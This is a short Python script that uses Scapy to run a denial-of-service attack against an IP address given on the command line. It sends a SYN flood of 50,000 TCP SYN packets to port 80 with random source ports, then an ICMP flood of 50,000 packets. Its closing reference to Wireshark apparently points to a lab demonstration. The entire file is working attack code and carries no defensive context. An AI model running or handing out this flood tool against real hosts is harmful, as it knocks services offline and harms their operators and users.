from scapy.all import *
import time

# Check if target IP was provided
if len(sys.argv) < 2:
    print("[-] Error: Target IP is required.")
    print(f"Usage: sudo python3 {sys.argv[0]} <target_ip>")
    sys.exit(1)

target = sys.argv[1]

print(f"[*] Starting attack on {target}")

# SYN flood - sends many TCP SYN packets
print("[*] Sending SYN flood...")
for i in range(100):
    pkt = [IP(dst=target)/TCP(dport=80, sport=RandShort(),flags="S") 
           for _ in range (500)]
    send(pkt, verbose=0)
    time.sleep(0.15)
    print(f"[+] Sent 500 SYN packets to {target}")
    
print("[*] Sending ICMP flood...")
for i in range(100):
    pkt = [IP(dst=target)/ICMP() 
           for _ in range(500)]
    send(pkt, verbose=0)
    time.sleep(0.15)
    print(f"[+] Sent 500 ICMP packets to {target}")
 

print("[+] Attack complete. Check Wireshark on the network.")
